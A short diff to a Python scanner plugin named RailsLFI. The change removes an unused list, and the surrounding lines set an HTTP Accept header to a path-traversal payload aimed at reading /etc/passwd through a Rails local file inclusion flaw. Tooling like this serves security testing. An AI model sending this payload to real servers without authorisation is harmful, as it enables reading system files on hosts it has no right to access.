@@ -6,8 +6,7 @@ class RailsLFI(IPlugin):
     def gen(self, cwd, urls, proxy, headers, timeout, cookies,
             postdata, module, datalist):
         requestList = []
-        domains = []
-            
+        
         for url in urls:
                 new_h = headers.copy()
                 new_h['Accept'] = '../../../../../../../../etc/passwd{{'
